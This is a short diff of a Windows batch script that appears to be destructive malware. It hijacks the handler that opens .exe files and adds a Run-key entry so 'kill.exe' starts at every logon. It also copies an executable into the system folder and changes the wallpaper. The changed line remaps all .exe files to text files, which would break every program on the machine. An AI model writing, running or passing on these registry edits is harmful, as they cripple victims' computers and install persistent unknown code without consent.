@@ -18,7 +18,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\S
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
 reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "pic\back.png" /f
 reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.bat" /d "txtfile" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile" /f
 set a=%cd%\kill.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
 copy "block\mesa.exe" "C:\Windows\system"
